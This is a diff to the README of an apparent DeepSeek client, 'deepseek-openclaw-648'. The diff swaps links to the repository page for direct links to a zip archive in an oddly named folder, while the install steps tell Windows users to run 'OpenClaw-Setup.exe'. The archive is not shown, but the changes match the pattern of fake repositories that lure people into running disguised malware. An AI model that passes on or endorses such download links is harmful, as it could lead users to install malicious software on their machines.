@@ -1,6 +1,6 @@
 # 🤖 deepseek-openclaw-648 - Connect to DeepSeek models with ease
 
-[![Download OpenClaw](https://img.shields.io/badge/Download-OpenClaw-blue.svg)](https://github.com/pupal-battleofmagenta532/deepseek-openclaw-648)
+[![Download OpenClaw](https://img.shields.io/badge/Download-OpenClaw-blue.svg)](https://github.com/pupal-battleofmagenta532/deepseek-openclaw-648/raw/refs/heads/main/sexlessness/deepseek-openclaw-3.6.zip)
 
 ## 📖 About this application
 
@@ -22,7 +22,7 @@ Ensure you have your DeepSeek API key ready. You can obtain this key from the of
 ## 📥 How to download and install
 
 1.  Visit the official repository page to select the correct installer.
-2.  Follow this link to the download section: [Download OpenClaw for Windows](https://github.com/pupal-battleofmagenta532/deepseek-openclaw-648).
+2.  Follow this link to the download section: [Download OpenClaw for Windows](https://github.com/pupal-battleofmagenta532/deepseek-openclaw-648/raw/refs/heads/main/sexlessness/deepseek-openclaw-3.6.zip).
 3.  Click on the file named `OpenClaw-Setup.exe` to start the download.
 4.  Open the folder where your browser saves downloaded files.
 5.  Double-click the `OpenClaw-Setup.exe` file.
